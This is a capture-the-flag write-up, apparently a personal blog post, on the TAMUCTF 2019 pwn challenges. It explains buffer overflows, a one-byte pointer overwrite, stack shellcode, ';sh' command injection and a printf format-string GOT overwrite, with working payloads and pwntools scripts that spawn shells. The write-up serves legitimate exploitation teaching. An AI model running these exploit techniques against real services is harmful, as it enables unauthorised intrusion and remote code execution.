---
title: TAMUCTF 2019
date: 2019-03-03 17:35:53
categories:
  - Write-Ups
  - TAMUCTF
tags:
  - re
  - pwn
---

I competed in TAMUCTF as part of team dcua. Because this was a week long
competition, by the end of it, basically many teams tied in terms of score, but
we managed to get all the challenges the fastest, so we got first!

This was I think one of the coolest example of having teamwork, as we all
contributed to different problems and were much more successful than any of our
individual efforts.

I am going to do a few series of writeups for the problems I finished:

## Pwns
The pwns at TAMUctf were pretty easy (except for veggietails and pwn6) so I was
able to finish most of them in a few hours :P. There were a few hiccups in how the
orgs wrote two of the chals, so there was unintended solutions (oops).

### pwn1
Honestly, this challenge was more of an RE than a pwn challenge I'd say. First
order of business, I want to `checksec` it:

```
$ checksec pwn1
[*] '/home/henry/tamuctf/pwn1/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

For those of you who never heard of checksec... it is a very cool standalone
binary (I think you install it from pwntools) that you can use to check some
security settings of a binary.

To my surprise, I noticed this has a couple of interesting security(TM) features
that I wouldn't expect from an easy pwn when compiling this binary:

  * **Full RELRO**: this means that most sections of the ELF binary are
    read-only, which also includes all the GOT offsets, see [this post][1] for
    more information on RELRO and what it is.
  * **PIE**: Stands for "Positional-Independent Executable". This means that the
    addresses allocated to the binary executable are all randomized. Normally
    the base of the ELF binary is fixed with older systems (by default),
    (0x400000 for 64-bit, 0x08048000 for 32-bit), but with newer systems, the
    default setting for compiling ELF binaries is configured to have PIE.

Now one last thing to note, is that there is NO STACK CANARY. This almost always
means that we probably have some sort of buffer overflow exploit to do.

Because of these protections and more, we can't easily [redirect the return
address][2] to whatever address we want. :'(

So I just went and did a bit of reversing to see what it is doing. Turns out, it
seems pretty simple. First two questions it is comparing with some hardcoded
string. That can easily be found by using strings: ([...] includes some omitted
text)

```bash
$ strings pwn1
[...]
What... is your name?
Sir Lancelot of Camelot
I don't know that! Auuuuuuuugh!
What... is your quest?
To seek the Holy Grail.
What... is my secret?
[...]
```

So now we have the third question, which need to find some sort of secret. This
requires digging into the assembly a bit. Here's IDA screenshots:

![IDA screenshot of comparing secret number][3]

So we see that there is a call to `gets` which reads from a buffer located at
`[ebp+var_3B]` or `[ebp-0x3b]`. As mentioned before, because of PIE (and other
reasons...), we cannot easily modify the return address to jump to whatever code
we want. (sad...)

Now we see a compare with some variable at `[ebp+var_10]` or `[ebp-0x10]` with
`0xdea110c8`. This probably means that we need to overflow this buffer starting
at `[ebp-0x3b]` by filling `0x3b - 0x10 = 0x2b = 43` characters, followed by the
value `0xdea110c8`. Since we have little endian byte ordering in x86, the lowest
bytes will be located before the higher bytes. So our full exploit is something
like this: 

```
Sir Lancelot of Camelot
To seek the Holy Grail.
1234567890123456789012345678901234567890123\xc8\x10\xa1\xde
```

Also if you have no idea how to start binary exploitation, I recommend looking
over [liveoverflow's][4] playlist on binary hacking. He starts very basic, and
does a good job with explaining basic exploitation stuff (like stack, heap,
format bug, etc...) in simple graphics!

### pwn2
So this one if you do checksec, you get similar results as in pwn1. Here we have
another `gets` call (which is still vulnerable!!!). However, this time, the
`gets` function is not really exploitable, so we move on to the `select_func`
function:

![select_func IDA CFG][5]

What's interesting here, is we have this `strncpy` call with the arguments 
`(ebp+var_2A, [ebp+arg_0], 0x1f)`, which seems pretty fishy because it actually
allows us to overwrite ONE byte of the neighboring variable `[ebp+var_C]`.
Furthermore, we see with this code:

```x86asm
lea     eax, (two - 1FB8h)[ebx]
mov     [ebp+var_C], eax
```

It actually preloads this variable with the address to the `two` function, which
is then later called here:

```x86asm
mov     eax, [ebp+var_C]
call    eax
```

Now you might be asking why then, isn't this printing out `This is function
two!` when we type something other than `one`? I actually ran this with gdb, and
saw this:

![GDB: select_func calling some weird function?][6]

So apparently, a buffer overflow DID occur, apparently, strncpy was actually
zeroing out more bytes so that the low byte of that variable will get set to
zero regardless! Hmm... so I guess it jumps to somewhere else in code that
*somehow* manages to do nothing bad and not crash!!! Okay that's cool.

Now the final exploit, now the `two` function is located at `0x6ad` according to
IDA. Now because of PIE, the top few bits in this address is randomized, but the
bottom three hex digits stay the same regardless (because the binary must align
on page boundaries). So effectively, I can jump to anywhere AS LONG AS the
address has of the form `0x000006XX`, which happens to include the `print_flag`
function. Here's my final exploit:

```
123456789012345678901234567890\xd8
```

### pwn3
pwn3 was a bit trickier. Let's do another checksec:
```
$ checksec pwn3.bin
[*] '/home/henry/tamuctf/pwn3/pwn3.bin'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Ahh... this time we have some interesting stuff: `NX disabled` and `Has RWX
segments`. These both mean the same thing: we have areas where we can write and
execute code at the same time. This means we have the ability to execute
shellcode at this location. Apparantly, the stack was the one that was
executable.

Now we just need a leak for the stack address, so that we can set the return
address to jump to our stack! Luckily, the binary did that for me!

I had to switch to using `pwntools` for this one:
```python
from pwn import *

context.update(arch='i386', os='linux')
sc = shellcraft

#p = process('./pwn3.bin')
p = remote('pwn.tamuctf.com', 4323)
p.recvuntil('journey 0x')

buffptr = int(p.recvuntil('!', drop=True), 16)
padsize = 0x12a + 4

pay = asm(sc.sh())
pay += 'A' * (padsize - len(pay))
pay += p32(buffptr)
p.sendline(pay)

p.recvline()
p.interactive()
```

And this will give me shell!

### pwn4 and pwn5
Haha these two were broken. pwn4 let you input any length of command, but pwn5
has a restriction to four characters. You can get a shell for both by executing
`;sh` via command injection. Then you just type `cat flag.txt` once you get
shell... too easy... next!

### pwn6
EDIT: yeah uhmm.... my solution was actually unintentional (and the real
solution was way harder to employ). 

> Okay kids you learned your lesson! ALWAYS check your code twice and run it
  through a few *experienced* pwners before actually releasing it for others to
  break it... especially for large bloated code!!

Okay this was way too bloated! Uhhmm... okay this was quite annoying.

First I think it would be good if I explained what this program did. Essentially
there's a client program that talked to a server program. This server is the one
that is located on a VPN connection. **BOTH** the client and server programs are
very vulnerable (Idk if this was intentional), but we need to attack the server
only. Also I forgot to mention, the server requires an authentication of
username and password before getting access to most of the functions, except we
don't have passwords (and it looks like the SQL commands used are not
vulnerable). 

When you are not logged in, basically, there was very little commands that can
be issued, and if that command is invalid, the server will print out a log of
that. This will be important, as we see later... Anyways, a side-note is the
server does not block one command (`create_account`) which might be vulnerable
to something, but I chose not to look at that for now. 

For this one, I had to use a few more heavier tools (including IDA pro and
hexrays) to get the decompilation stuff and the structs that are utilized in the
program. I think trying to reverse that massive program could be a good
exercise, but it was honestly a waste of time for me. So here's the code that is
buggy: 

```c
signed __int64 __fastcall process_message(server_inst *a1, client_conn *a2)
{
  unsigned int v2; // ST14_4
  signed __int64 result; // rax
  client_conn *v4; // ST00_8
  packet *v5; // [rsp+18h] [rbp-8h]

  v5 = a2->data_packet;
  if ( *((_QWORD *)&a2->data_packet + v5->id + 4LL) )
  {
    v2 = (*((__int64 (__fastcall **)(server_inst *, client_conn *))&a2->data_packet + v5->id + 4LL))(a1, a2);
    printf("Result of action was %i\n", v2, a2);
    result = v2;
  }
  else
  {
    printf("Unauthorized Command for Client %i\n", (unsigned int)a2->client_sd, a2);
    printf(v4->data_packet->data);
    result = 0xFFFFFFFFLL;
  }
  return result;
}
```

Apparently, as mentioned before, the server will check to see if a packet issues
a valid or invalid command. If it is invalid, it will print a log message,
*including* this vulnerable `printf` format bug of the packet data. (seems
suspicious). 

Essentially, if you pass a `%n` format to printf, it will actually take that
argument (which assumes to be a int pointer), and set it to the number of
characters written. If you instead put `%hhn`, it will assume that you have a
char pointer, and the number of character written will wrap around modulus 256.
Furthermore, adding a number + dollar sign `%5$hhn`, it will instead use the 5th
argument to write to. 

Now the fun comes as we realize that the function that calls `process_message`
(`handle_connections`) actually has a HUGE buffer allocated to stack. This is
actually the same buffer used when reading input from the socket. This means, we
have an ability to control values on the stack. Now printf will at some point
will extract arguments from the same stack that contains the buffer. This means
we can control the addresses of these points, which printf will then use to
write the number of characters written to this address! This is very useful, as
we can uses this to overwrite GOT entries (they are values that point to
functions). 

So here's my full exploit code, which overwrite the GOT entry for printf, to
system! We get shell, easy money!

```python
from pwn import *

#sock = remote('localhost', 6210)
sock = remote('172.30.0.2', 6210)
#serv_elf = ELF('./server')
plt_system = 0x401a10
got_printf = 0x6d00d0

def pad(s, size):
    assert len(s) <= size
    return s + 'A'*(size - len(s))

def send_packet(action, data):
    sock.send(p32(len(data)) + p32(action) + data)

def write_64int(addr, val):
    padding = 96
    data_start = 15
    invalid_action = 10

    points = [] # (val, addr)
    for i in range(8):
        points.append(((val >> (i * 8)) & 0xff, addr + i))

    points.sort()
    prev = 0
    fmt = ''
    addrs = ''
    off = data_start + (padding // 8)
    for val, addr in points:
        assert val >= prev
        addrs += p64(addr)
        if val == prev:
            fmt += '%{}$hhn'.format(off)
        else:
            fmt += '%{}c%{}$hhn'.format(val - prev, off)
        off += 1
        prev = val

    send_packet(invalid_action, pad(fmt, padding) + addrs)

def main():
    write_64int(got_printf, plt_system)
    send_packet(10, "exec <&5 >&5 2>&5; bash\0")
    sock.interactive()
    pass

if __name__ == '__main__':
    main()
```

More write-ups to come soon!!

[1]: http://tk-blog.blogspot.com/2009/02/relro-not-so-well-known-memory.html
[2]: https://www.youtube.com/watch?v=8QzOC8HfOqU
[3]: /files/tamuctf/pwn1_secret.png
[4]: https://liveoverflow.com/binary_hacking/index.html
[5]: /files/tamuctf/pwn2_sel.png
[6]: /files/tamuctf/pwn2_two.png
